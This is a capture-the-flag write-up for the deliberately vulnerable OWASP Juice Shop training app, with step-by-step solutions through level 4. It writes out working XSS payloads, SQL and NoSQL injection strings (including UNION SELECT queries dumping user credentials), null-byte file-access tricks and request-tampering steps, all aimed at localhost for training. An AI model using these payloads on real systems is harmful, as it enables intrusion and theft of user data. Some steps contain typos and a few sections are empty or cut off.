# owasp-juice-shop
OWASP juice shop Writeup with all solutions till level 5


This is an CTF solutions for Latest Version of OWASP Juice Shop.

—   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   

# LEVEL - 1

—-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  

## 0 - (Score Board)

For this challenge you need to search all the paths to get score board here we will **dirsearch** to do this and got following with status code 200

- /.well-known/security.txt
- /ftp
- /robots.txt

## 1 -  (Error Handling)

There are always some location available in each website which require authentication to access

the following endpoint occurred and error.

    http://localhost:3000/profile

## 2 -  (Privacy Policy)

Read our privacy policy

this is always to recommend to read for security policy 

- Login into Application with valid credentials
- Privacy & Security > Privacy Policy

## 3 - (Outdated Whitelist)

## 4 -  (Confidential Document)

Access a confidential Document

use **dirb** tool you will end up with a path /ftp

    http://localhost:3000/ftp

Only .md and .pdf files are allowed!

## 5 -  (XSS Dom based)

got to search bar and enter below payload

    <iframe src="javascript:alert(`xss`)">

## 6 -  (XSS Reflected)

Go to track orders option

    <iframe src="javascript:alert(`xss`)">

## 7-  (Repetitive Registration)

there is flaw in Registration

Follow the DRY principle while registering a user

- type password & repeat password both > correct

eg :- 1234,1234 (this will validate the second filed )

once validated change the real password and let be repeat password the same

eg - 12345,1234

if it accepts then this is flaw.

## 8 -  (Zero-Stars)

Give a devastating zero-star feedback to the store

go to > Costumer feedback

use 'inspect element' on  the submit button.

    make > enabeld="true"

—   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   

# LEVEL -2

—-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  

## 1- Security Policy

Behave like any "white-hat" should before getting into the action.

look for /.well-known/security.txt 

## 2 - Login Admin (Injection)

Log in with the administrator's user account.

    username - '1=1 --
    password - anypassword
    (this will give access to the first user i.e admin)

## 3 - Admin Section (Broken Access Control)

once logged in with the help of injection in admin account visit following URL.

    http://localhost:3000/#/administration

and here you get admin panel section access

## 4 - Five-Star Feedback (Broken Access Control)

get into admin account and using the injection

once got access into admin account 

go to /administration section and here you get complete access to admin section to remove the all feedbacks of 5 stars.

## 5 - View basket

## 6 - Deprecated Interface B2B

here you need to upload a file whose extension is not allowed

we will check main.js here we get if search for pdf or zip 

the result will be like > there is one more file extension allowed

eg:- upload xml file to solve this challenge and look for console we get 410 Gone  

## 7 - Password Strength

Log in with the administrator's user credentials without previously changing them or applying SQL Injection.

Do SQL injection you will get an hash for a password > get original value using rainbow table,

else you can brute-force because password for admin is so easy

    admin123

## 8- Login MC SafeSearch

(google MC SafeSearch) - listen to video you will get password

Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass.

    username - mc.safesearch@juice-sh.op
    password - Mr. N00dles

## 9 - Stored Simple XSS on username

1. hange the username into `<script>alert(`xss`)</script>` and click *Set Username*.
2. Notice the displayed username under the profile picture now is `lert(`xss`)` while in the *Username* field it shows `lert(`xss`)</script>` - both a clear indication that the malicious input was sanitized. Obviously the sanitization was not very sophisticated, as the input was quite mangled and even the closing `<script>` tag survived the procedure.
3. Change the username into `<<a|ascript>alert(`xss`)</script>` and click *Set Username*.
4. The naive sanitizer only removes `<a|a` effectively changing the username into `<script>alert(`xss`)</script>` thus resulting in the expected alert box popping up.
5. use the following payload.

    <<a|ascript>alert(`xss`)</script>

## 10 - Weird Crypto

—   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   

# LEVEL -3

—-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  

## 1 - API-only XSS

(Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> without using the frontend application at all.)

1. g in to the application with any user.
2. Copy your `Authorization` header from any HTTP request submitted via browser.
3. Submit a POST request to [http://localhost:3000/api/Products](http://localhost:3000/api/Products) with
    - `{"name": "XSS", "description": "<iframe src=\"javascript:alert(`xss`)\">", "price": 47.11}` as body,
    - `application/json` as `Content-Type`
    - and `Bearer ?` as `Authorization` header, replacing the `?` with the token you copied from the browser.

## 2 - Client-side XSS Protection

use POSTMAN tool

Perform a persisted XSS attack with <iframe src="javascript:alert(``xss``)"> without using the frontend application at all.

Submit a POST request to [http://localhost:3000/api/Users](http://localhost:3000/api/Users) with

- `{"email": "<iframe src=\"javascript:alert(``xss``)\">", "password": "xss"}` as body
- and `application/json` as `Content-Type` header.

1. Log in to the application with any user.
2. Visit [http://localhost:3000/#/administration](http://localhost:3000/#/administration).
3. An alert box with the text "xss" should appear.

## 3 - Admin Registration

Register as a user with administrator privileges.

when Registration the api send a post request as follows

Submit a POST request to [http://localhost:3000/api/Users](http://localhost:3000/api/Users) with

{"email":"demo@demo.com","password":"12345","passwordRepeat":"12345","securityQuestion":{"id":9,"question":"Your ZIP/postal code when you were a teenager?","createdAt":"2019-10-13T06:02:00.790Z","updatedAt":"2019-10-13T06:02:00.790Z"},"securityAnswer":"431005"}

in response we get  **"role":"customer"** 

append it with value : **"admin"**

{"email":"demo@demo.com","password":"12345","passwordRepeat":"12345", 
**"role":"customer"** ,"securityQuestion":{"id":9,"question":"Your ZIP/postal code when you were a teenager?","createdAt":"2019-10-13T06:02:00.790Z","updatedAt":"2019-10-13T06:02:00.790Z"},"securityAnswer":"431005"}

## 4 - Bjoern's Favorite Pet

Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question.

This conference talk recording immediately dives into a demo of the Juice Shop application in which Bjoern starts registering a new account 3:59 into the video ([https://youtu.be/Lu0-kDdtVf4?t=239](https://youtu.be/Lu0-kDdtVf4?t=239))

    Zaya

## 5 - Forged Feedback

Post some feedback in another users name.

- In this we need to intercept the request send from browser to server in burpsuite

on following endpoint

[http://localhost:3000/api/Feedbacks/](http://localhost:3000/api/Feedbacks/)

where when we click on submit following POST request is send

{"UserId":16,"captchaId":16,"captcha":"51","comment":"testing,"rating":2}

here we can simply replace the UserId parameter with another UserId which will make following request as following.

{"UserId":**14**,"captchaId":16,"captcha":"51","comment":"testing,"rating":2}

## 6 - Forged Review

Post a product review as another user or edit any user's existing review.

- In this we need to intercept the request send from browser to server in burpsuite

on following endpoint

[http://localhost:3000/rest/products/1/reviews](http://localhost:3000/rest/products/1/reviews)

where when we click on submit following POST request is send

{"message":"this is awesome [product",**"author":"testinglikepro@gmail.com](mailto:product%22,%22author%22:%22testinglikepro@gmail.com)"**}

here we can simply replace the author parameter with another author email which will make following request as following.

{"message":"this is awesome [product",**"author":"](mailto:product%22,%22author%22:%22testinglikepro@gmail.com)demo@demo.com"**}

## 7 - Manipulate Basket

Put an additional product into another user's shopping basket.

- When you add a product to your basket a following POST request is being send.

[http://localhost:3000/api/BasketItems/](http://localhost:3000/api/BasketItems/)

with your Authorisation bearer

(lets assume your **"BasketId":"14"** , and victims **"BasketId":"15"** )

the request will be like this.

{"ProductId":22,"BasketId":"14","quantity":1}  //normal

{"ProductId":22,"BasketId":"15","quantity":1}  //manipulated

but we get error as invalid BucketId

here comes the **HTTP parameter pollution attack**

"ProductId":22,"BasketId":"15","quantity":1,"BasketId":"13"} 

and here you win.

## 8 - Payback Time

Place an order that makes you rich.

Here goal is to make a basket **quantity in a negative value**.

1. Log in as any user.
2. Put at least one item into your shopping basket.
3. Note that reducing the quantity of a basket item below 1 is not possible via the UI
4. When changing the quantity via the UI, you will notice `PUT` requests to [http://localhost:3000/api/BasketItems/{id}](http://localhost:3000/api/BasketItems/%7Bid%7D) in the Network tab of your DevTools
5. Memorize the `{id}` of any item in your basket
6. Copy your `Authorization` header from any HTTP request submitted via browser.
7. Submit a `PUT` request to [http://localhost:3000/api/BasketItems/{id}](http://localhost:3000/api/BasketItems/%7Bid%7D) replacing `{id}` with the memorized number from 5. and with:
    - `{"quantity": -100}` as body,
    - `application/json` as `Content-Type`
    - and `Bearer ?` as `Authorization` header, replacing the `?` with the token you copied from the browser.
8. Continue Proceed and Click Checkout to issue the negative order and solve this challenge.

## 9 - CAPTCHA Bypass

Submit 10 or more customer feedbacks within 10 seconds.

This is simple send same 10 requests with same captcha value and id

eg :- 

1. Submit a `POST` request to [http://localhost:3000/api/Feedbacks](http://localhost:3000/api/Feedbacks) 
    - {"UserId":36,"captchaId":20,"captcha":"-29","comment":"thisisgreat","rating":1} as body,
    - `application/json` as `Content-Type`
    - and `Bearer ?` as `Authorization` header, replacing the `?` with the token you copied from the browser.

        use the same post request 10 times using any script or manual.

## 10 - Product Tampering

Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into [https://owasp.slack.com](https://owasp.slack.com/).

1. Submit a `PUT` request to [http://localhost:3000/api/Products/9](http://localhost:3000/api/Products/9)
    - {"description":"<a href=\"[https://owasp.slack.com](https://owasp.slack.com/)\" target=\"_blank\">More...</a>"} as body,
    - `application/json` as `Content-Type`
    - and `Bearer ?` as `Authorization` header, replacing the `?` with the token you copied from the browser.

## 11 - Privacy Policy Inspection

Prove that you actually read our privacy policy.

1. Open [http://localhost:3000/#/privacy-security/privacy-policy](http://localhost:3000/#/privacy-security/privacy-policy).
2. Moving your mouse cursor over each paragraph will make a fire-effect appear on certain words or partial sentences.
3. spect the HTML in your browser and note down all text inside `<span class="hot">` tags, which are `http://localhost`, `We may also`, `instruct you`, `to refuse all`, `reasonably necessary` and `responsibility`.
4. Combine those into the URL [http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility](http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility) (adding the server port if needed) and solve the challenge by visiting it.

It seems the Juice Shop team did not appreciate your extensive reading effort enough to provide even a tiny gratification, as you will receive only a `404 Error: ENOENT: no such file or directory, stat '/app/frontend/dist/frontend/assets/private/thank-you.jpg'`.

## 12 - Login Jim

Log in with Jim's user account.

- Log in with *Email* `jim@juice-sh.op'--` and any *Password* if you already know the email address of Jim.
- or log in with *Email* `jim@juice-sh.op` and *Password* `ncc-1701` if you looked up Jim's password hash in a rainbow table after harvesting the user data as described in [Retrieve a list of all user credentials via SQL Injection](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#retrieve-a-list-of-all-user-credentials-via-sql-injection).

## 13 - Reset Jim's Password

Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.

Visit [http://localhost:3000/#/forgot-password](http://localhost:3000/#/forgot-password) and provide jim@juice-sh.op as your Email to learn that Your eldest siblings middle name? is Jim's chosen security question

- look for all products reviews

- A product review for the *OWASP Juice Shop-CTF Velcro Patch* stating *"Looks so much better on my uniform than the boring Starfleet symbol."*
- Another product review *"Fresh out of a replicator."* on the *Green Smoothie* product
- google **"Jim Starfleet"**

now look for siblings the name is : **"Samuel"**

## 14 - Upload Size

Upload a file larger than 100 kB, but less than 200kB

1. The client-side validation prevents uploads larger than 100 kB.
2. Craft a `POST` request to [http://localhost:3000/file-upload](http://localhost:3000/file-upload) with a form parameter `file` that contains a PDF file of more than 100 kB but less than 200 kB.
3. The response from the server will be a `204` with no content, but the challenge will be successfully solved.

Files larger than 200 kB are rejected by an upload size check on server side with a `500` error stating `Error: File too large`.

## 15 - Upload a file that has no .pdf or .zip extension

Upload a  file larger than 100 kB, but less than 200kB with any extension other than .pdf, .zip to solve this. 

1. Craft a `POST` request to [http://localhost:3000/file-upload](http://localhost:3000/file-upload) with a form parameter `file` that contains a PDF file of more than 100 kB but less than 200 kB with any other extension other than .pdf and .zip
2. The response from the server will be a `204` with no content, but the challenge will be successfully solved.

## 16 -  Login Amy

Log in with Amy's original user credentials

Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note")

1. Google for either `93.83 billion trillion trillion centuries` or `One Important Final Note`.
2. Both searches should show [https://www.grc.com/haystack.htm](https://www.grc.com/haystack.htm) as one of the top hits.
3. After reading up on *Password Padding* try the example password `D0g.....................`
4. She actually did a very similar padding trick, just with the name of her husband *Kif* written as *K1f* instead of *D0g* from the example! She did not even bother changing the padding length!
5. Visit [http://localhost:3000/#/login](http://localhost:3000/#/login) and log in with credentials `amy@juice-sh.op` and password `K1f.....................` to solve the challenge

## 17 - Database Schema

Exfiltrate the entire DB schema definition via SQL Injection.

send a GET request on following endpoint 

[http://localhost:3000/rest/products/search?q=](http://localhost:3000/rest/products/search?q=)1

    qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master-- solves the challenge.

## 18 - GDPR Data Erasure

Log in with Chris' erased user account.

- Log in with *Email* `chris.pike@juice-sh.op'--` and any *Password* if you already know the email address of Chris.
- or log in with *Email* as `\' or deletedAt IS NOT NULL--` and any *Password* you like for a "lucky hit" as Chris seems to be the only or at least first ever deleted user. The presence of `deletedAt` you might have derived from [Retrieve a list of all user credentials via SQL Injection](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#retrieve-a-list-of-all-user-credentials-via-sql-injection) and enforcing it to be `NOT NULL` will give you back only users who were soft-deleted at some point of time.

## 19 - Login Bender

Log in with Bender's user account.

Log in with Email bender@juice-sh.op'-- and any Password if you already know the email address of Bender.

—   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   

# LEVEL -4

—-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  

## 1 - Access Log

Gain access to any access log file of the server.

- recon can make you win in this challenge

 

1. Following [the hint to drill down deeper than one level](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/sensitive-data-exposure.html#gain-access-to-any-access-log-file-of-the-server), you will at some point end up with [http://localhost:3000/support/logs](http://localhost:3000/support/logs).
2. Inside you will find at least one `access.log` of the current day. Open or download it to solve this challenge.

## 2 - Christmas Special

Order the Christmas special offer of 2014.

do a GET request on the following endpoint

[http://localhost:3000/rest/products/search?q=](http://localhost:3000/rest/products/search?q=%27)

just to execute sql statement or fix query we do following in URL

    http://localhost:3000/rest/products/search?q=')) --+

    ')) to close the query is SQLlite and --+ to comment remaining 

now you get id response for Christmas offer id i.e **10**

    {
    id	10,
    name	"Christmas Super-Surprise-Box (2014 Edition)",
    description	"Contains a random selection of 10 bottles (each 500ml) of our tastiest juices and an extra fan shirt for an unbeatable price! (Seasonal special offer! Limited availability!)",
    price	29.99,
    deluxePrice	29.99,
    image	"undefined.jpg",
    createdAt	"2019-10-13 06:02:02.907 +00:00",
    updatedAt	"2019-10-13 06:02:02.907 +00:00",
    deletedAt	"2014-12-27 00:00:00.000 +00:00",
    }

now use the Product id while purchasing **id:10** to solve this challenge.

    {"ProductId":10,"BasketId":"20","quantity":1}

## 3 -  Leaked Unsafe Product

Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous.

Submit a comment containing both **Eurogium Edule** and **Hueteroneel** via 

`http://localhost:3000/#/contact` 
to solve this challenge

## 4 - Easter Egg

Find the hidden easter egg.

1. Use the Poison Null Byte attack described in Access a developer's forgotten backup file... 

2. ...to download [`http://localhost:3000/ftp/eastere.gg%2500.md`](http://localhost:3000/ftp/eastere.gg%2500.md)

Posison `NULL BYTE - [%2500](http://localhost:3000/ftp/eastere.gg%2500.md)`

## 5 - Nested Easter Egg

Apply some advanced cryptanalysis to find the real easter egg.

when you open this file downloaded from this.

[`http://localhost:3000/ftp/eastere.gg%2500.md`](http://localhost:3000/ftp/eastere.gg%2500.md)

now you will get a string in this file.

`L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==`

now we can understand it is base64

once we decode the string you get.

`/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt`

again you are trapped, here i think ROT13 algorithm is used.

once we decode it with ROT13

we get the following.. string lets try this as path

`/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg`

[http://localhost:3000/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg](http://localhost:3000/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg)

## 6 - Expired Coupon

Successfully redeem an expired campaign coupon code.

## 7 - Forgotten Developer Backup

Access a developer's forgotten backup file.

1. Browse to `http://localhost:3000/ftp` (like in Access a confidential document.
Opening `http://localhost:3000/ftp/package.json.bak` directly will fail complaining about an `illegal file type.`
2. Exploiting the parameter like in Access a salesman's forgotten backup file will not work here -
probably because is not a Markdown file.
3. Using a *`Poison Null Byte* ( %00 )` the filter can be tricked, but only with a twist:
Accessing `http://localhost:3000/ftp/package.json.bak%00.md` will surprisingly **not** succeed...
...because the `% character needs to be URL-encoded (into %25 )` as well in order to work its magic later
during the file system access.
`http://localhost:3000/ftp/package.json.bak%2500.md` will ultimately solve the challenge.

## 8 - Forgotten Sales Backup

Access a salesman's forgotten backup file.

1. Use the Poison Null Byte attack described in Access a developer's forgotten backup file... 

2. ...to download [`http://localhost:3000/ftp/coupons_2013.md.bak%00.md`](http://localhost:3000/ftp/coupons_2013.md.bak%2500.md)

## 9 - Login Bjoern

1. Bjoern has registered via Google OAuth with his (real) account [bjoern.kimminich@googlemail.com](mailto:bjoern.kimminich@googlemail.com).
2. Cracking his password hash will probably not work.
3. To find out how the OAuth registration and login work, inspect the `main.js` and search for `oauth`, which will eventually reveal a function `userService.oauthLogin()`.
4. In the function body you will notice a call to `userService.save()` - which is used to create a user account in the non-Google *User Registration* process - followed by a call to the regular `userService.login()`
5. The `save()` and `login()` function calls both leak how the password for the account is set: `password: btoa(n.email.split("").reverse().join(""))`
6. Some Internet search will reveal that `window.btoa()` is a default function to encode strings into Base64.
7. What is passed into `btoa()` is `email.split("").reverse().join("")`, which is simply the email address string reversed.
8. Now all you have to do is Base64-encode `moc.liamg@hcinimmik.nreojb`, so you can log in directly with *Email* `bjoern.kimminich@gmail.com` and *Password* `bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=`.

## 10 - GDPR Data Theft

Steal someone else's personal data without using Injection.

1. Log in as any user, put some items into your basket and create an order from these.
2. Copy the order ID from the confirmation PDF. It should look similar to `5267-829f123593e9d098` in its format.
3. Visit [http://localhost:3000/#/track-order](http://localhost:3000/#/track-order), paste in your *Order ID* and then click *Track*.
4. In the network tab of your browser you should find a request similar to [http://localhost:3000/rest/track-order/7962-6e31e50a0c6f2ea3](http://localhost:3000/rest/track-order/7962-6e31e50a0c6f2ea3).
5. Inspecting the response closely, you might notice that the user email address is partially obfuscated: `{"status":"success","data":[{"orderId":"5267-829f123593e9d098",**"email":"*dm*n@j**c*-sh.*p"**,"totalPrice":2.88,"products":[{"quantity":1,"name":"Apple Juice (1000ml)","price":1.99,"total":1.99,"bonus":0},{"quantity":1,"name":"Apple Pomace","price":0.89,"total":0.89,"bonus":0}],"bonus":0,"eta":"2","_id":"tosmfPsDaWcEnzRr3"}]}`
6. It looks like certain letters - seemingly all vowels - were replaced with `*` characters before the order was stored in the database.
7. Register a new user with an email address that would result in *the exact same* obfuscated email address. For example register `edmin@juice-sh.op` to steal the data of `admin@juice-sh.op`.
8. Log in with your new user and immediately get your data exported via [http://localhost:3000/#/privacy-security/data-export](http://localhost:3000/#/privacy-security/data-export).
9. You will notice that the order belonging to the existing user `admin@juice-sh.op` (in this example `5267-829f123593e9d098`) is part of your new user's data export due to the clash when obfuscating emails!

## 11 - Misplaced Signature File

Access a misplaced SIEM signature file.

1. Use the *Poison Null Byte* attack described in Access a developer's forgotten backup file...
2. ...to download [http://localhost:3000/ftp/suspicious_errors.yml%2500.md](http://localhost:3000/ftp/suspicious_errors.yml%2500.md)

## 12 - NoSQL DoS

Let the server sleep for some time. (It has done more than enough hard work for you)

1. You can interact with the backend API for product reviews via the dedicated endpoints `/rest/products/reviews` and `/rest/products/{id}/reviews`
2. Get the reviews of the product with database ID 1: [http://localhost:3000/rest/products/1/reviews](http://localhost:3000/rest/products/1/reviews)
3. Inject a `[sleep(integer ms)` command](https://docs.mongodb.com/manual/reference/method/sleep/) by changing the URL into [http://localhost:3000/rest/products/sleep(2000)/reviews](http://localhost:3000/rest/products/sleep(2000)/reviews) to solve the challenge

To avoid *real* Denial-of-Service (DoS) issues, the Juice Shop will only wait for a maximum of 2 seconds, so [http://localhost:3000/rest/products/sleep(999999)/reviews](http://localhost:3000/rest/products/sleep(999999)/reviews) should not take longer than [http://localhost:3000/rest/products/sleep(2000)/reviews](http://localhost:3000/rest/products/sleep(2000)/reviews) to respond.

## 13 - NoSQL Manipulation

Update multiple product reviews at the same time.

orignal Request URL :-  PUT [http://localhost:3000/rest/products/24/reviews](http://localhost:3000/rest/products/24/reviews)

manipulated Request URL :- PATCH [http://localhost:3000/rest/products/reviews](http://localhost:3000/rest/products/24/reviews)

`{ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }` as a body

- as `Content-Type` header.
- and `Bearer ?` as `Authorization` header, replacing the `?` with the token

Check different product detail dialogs to verify that all review texts have been changed into NoSQL Injection!

## 14 -Whitelist Bypass - Unvalidated Redirects

Enforce a redirect to a page you are not supposed to redirect to.

1. Pick one of the redirect links in the application, e.g. [http://localhost:3000/redirect?to=https://github.com/bkimminich/juice-shop](http://localhost:3000/redirect?to=https://github.com/bkimminich/juice-shop) from the *GitHub*-button in the navigation bar.
2. Trying to redirect to some unrecognized URL fails due to whitelist validation with `406 Error: Unrecognized target URL for redirect`.
3. Removing the `to` parameter ([http://localhost:3000/redirect](http://localhost:3000/redirect)) will instead yield a `500 TypeError: Cannot read property 'indexOf' of undefined` where the `indexOf` indicates a severe flaw in the way the whitelist works.
4. Craft a redirect URL so that the target-URL in `to` comes with an own parameter containing a URL from the whitelist, e.g. [http://localhost:3000/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop](http://localhost:3000/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop)

## 15 - Reset Bender's Password

Reset Bender's password via the Forgot Password mechanism with the original answer to his security question.

1. Trying to find out who "Bender" might be should *immediately* lead you to *Bender from [Futurama](http://www.imdb.com/title/tt0149460/)* as the only viable option

    +

    ![](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/Bender_Rodriguez.png)

2. Visit [https://en.wikipedia.org/wiki/Bender_(Futurama](https://en.wikipedia.org/wiki/Bender_(Futurama)) and read the *Character Biography* section
3. It tells you that Bender had a job at the metalworking factory, bending steel girders for the construction of *suicide booths*.
4. Find out more on *Suicide Booths* on [http://futurama.wikia.com/wiki/Suicide_booth](http://futurama.wikia.com/wiki/Suicide_booth)
5. This site tells you that their most important brand is *Stop'n'Drop*
6. Visit [http://localhost:3000/#/forgot-password](http://localhost:3000/#/forgot-password) and provide `bender@juice-sh.op` as your *Email*
7. In the subsequently appearing form, provide `Stop'n'Drop` as *Company you first work for as an adult?*
8. Then type any *New Password* and matching *Repeat New Password*
9. Click *Change* to solve this challenge

## 16 - Steganography

Rat out a notorious character hiding in plain sight in the shop. (Mention the exact name of the character)

Security through Obscurity

1. Looking for irregularities among the image files you will at some point notice that `5.png` is the only PNG file among otherwise only JPGs in the customer feedback carousel:

    ![](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/steganography.png)

2. Running this image through some decoders available online will probably just return garbage, e.g. [http://stylesuxx.github.io/steganography/](http://stylesuxx.github.io/steganography/) gives you `ÿÁÿm¶Û$–ÿ ?HÕPü^‡ÛN'c±UY‰;fä’HÜmÉ#r<v¸` or [https://www.mobilefish.com/services/steganography/steganography.php](https://www.mobilefish.com/services/steganography/steganography.php) gives up with `No hidden message or file found in the image`. On [https://incoherency.co.uk/image-steganography/#unhide](https://incoherency.co.uk/image-steganography/#unhide) you will also find nothing independent of how you set the *Hidden bits* slider:
3. Moving on to client applications you might end up with [OpenStego](https://www.openstego.com/) which is built in Java but also offers a Windows installer at [https://github.com/syvaidya/openstego/releases](https://github.com/syvaidya/openstego/releases).
4. Selecting the `5.png` and clicking *Extract Data* OpenStego will quickly claim to have been successful:

    ![](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/steganography_openstego-success.png)

5. The image that will be put into the *Output Stego file* location clearly depicts a pixelated version of [Pickle Rick](https://en.wikipedia.org/wiki/Pickle_Rick) (from S3E3 - one of the best [Rick & Morty](https://en.wikipedia.org/wiki/Rick_and_Morty) episodes ever)

    ![](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/steganography_pickle-rick.png)

6. Visit [http://localhost:3000/#/contact](http://localhost:3000/#/contact)
7. Submit your feedback containing the name `Pickle Rick` (case doesn't matter) to solve this challenge.

## 17 - Legacy Typosquatting (Vulnerable Components)

Inform the shop about a typosquatting trick it has been a victim of at least in v6.2.0-SNAPSHOT. (Mention the exact name of the culprit)

1. Solve the [Access a developer's forgotten backup file](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#access-a-developers-forgotten-backup-file) challenge and open the `package.json.bak` file
2. Scrutinizing each entry in the `dependencies` list you will at some point get to `epilogue-js`, the overview page of which gives away that you find the culprit at [https://www.npmjs.com/package/epilogue-js](https://www.npmjs.com/package/epilogue-js)

    ![](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/npm_epilogue-js.png)

3. Visit [http://localhost:3000/#/contact](http://localhost:3000/#/contact)
4. Submit your feedback with `epilogue-js` in the comment to solve this challenge

You can probably imagine that the typosquatted `epilogue-js` would be *a lot harder* to distinguish from the original repository `epilogue`, if it where not marked with the *THIS IS **NOT** THE MODULE YOU ARE LOOKING FOR!*-warning at the very top. Below you can see the original `epilogue` NPM page:

![](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/npm_epilogue.png)

## 18 -User Credentials (Retrieve a list of all user credentials via SQL Injection.)

1. During the [Order the Christmas special offer of 2014](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#order-the-christmas-special-offer-of-2014) challenge you learned that the `/rest/products/search` endpoint is susceptible to SQL Injection into the `q` parameter.
2. The attack payload you need to craft is a `UNION SELECT` merging the data from the user's DB table into the products returned in the JSON result.
3. As a starting point we use the known working `'))--` attack pattern and try to make a `UNION SELECT` out of it
4. Searching for `')) UNION SELECT * FROM x--` fails with a `SQLITE_ERROR: no such table: x` as you would expect. But we can easily guess the table name or infer it from one of the previous attacks on the *Login* form where even the underlying SQL query was leaked.
5. Searching for `')) UNION SELECT * FROM Users--` fails with a promising `SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns` which least confirms the table name.
6. The next step in a `UNION SELECT`-attack is typically to find the right number of returned columns. As the *Search Results* table in the UI has 3 columns displaying data, it will probably at least be three. You keep adding columns until no more `SQLITE_ERROR` occurs (or at least it becomes a different one):
    1. `')) UNION SELECT '1' FROM Users--` fails with `number of result columns` error
    2. `')) UNION SELECT '1', '2' FROM Users--` fails with `number of result columns` error
    3. `')) UNION SELECT '1', '2', '3' FROM Users--` fails with `number of result columns` error
    4. (...)
    5. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM Users--` *still fails* with `number of result columns` error
    6. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users--` finally gives you a JSON response back with an extra element `{"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"}`.
7. Next you get rid of the unwanted product results changing the query into something like `qwert')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users--` leaving only the "`UNION`ed" element in the result set
8. The last step is to replace the fixed values with correct column names. You could guess those **or** derive them from the RESTful API results **or** remember them from previously seen SQL errors while attacking the *Login* form.
9. Searching for `qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--` solves the challenge giving you a the list of all user data in convenient JSON format.

    ![](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/union_select-attack_result.png)

There is of course a much easier way to retrieve a list of all users as long as you are logged in: Open [http://localhost:3000/#/administration](http://localhost:3000/#/administration) while monitoring the HTTP calls in your browser's developer tools. The response to [http://localhost:3000/rest/user/authentication-details](http://localhost:3000/rest/user/authentication-details) also contains the user data in JSON format. But: This list has all the password hashes replaced with `*`-symbols, so it does not count as a solution for this challenge.

## 19 -Vulnerable Library (Vulnerable Components)

Inform the shop about a vulnerable library it is using. (Mention the exact library name and version in your comment)

Juice Shop depends on a JavaScript library with known vulnerabilities. Having the `package.json.bak` and using an online vulnerability database like [Retire.js](https://retirejs.github.io/) or [Snyk](https://snyk.io/vuln) makes it rather easy to identify it.

+

1. Solve [Access a developer's forgotten backup file](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/sensitive-data-exposure.html#access-a-developers-forgotten-backup-file)
2. Checking the dependencies in `package.json.bak` for known vulnerabilities online will give you a match (at least) for
    - `sanitize-html`: Sanitization of HTML strings is not applied recursively to input, allowing an attacker to potentially inject script and other markup (see [https://snyk.io/vuln/npm:sanitize-html:20160801](https://snyk.io/vuln/npm:sanitize-html:20160801))
    - `express-jwt`: Inherits an authentication bypass and other vulnerabilities from its dependencies (see [https://app.snyk.io/test/npm/express-jwt/0.1.3](https://app.snyk.io/test/npm/express-jwt/0.1.3))
3. Visit [http://localhost:3000/#/contact](http://localhost:3000/#/contact)
    1. Submit your feedback with the string pair `sanitize-html` and `1.4.2` appearing somewhere in the comment. Alternatively you can submit `express-jwt` and `0.1.3`..

    ## 20 - Server-side XSS Protection

